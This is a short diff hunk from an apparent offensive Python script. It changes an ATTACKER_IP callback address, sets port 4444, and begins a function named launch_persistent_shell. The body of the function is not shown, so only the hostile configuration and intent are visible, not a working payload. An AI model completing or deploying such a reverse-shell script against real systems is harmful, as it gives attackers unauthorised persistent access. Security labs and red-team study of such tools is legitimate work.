@@ -6,7 +6,7 @@ import time
 import sys
 import tempfile
 
-ATTACKER_IP = "192.168.56.1"
+ATTACKER_IP = "10.11.73.46"
 ATTACKER_PORT = 4444
 
 def launch_persistent_shell():
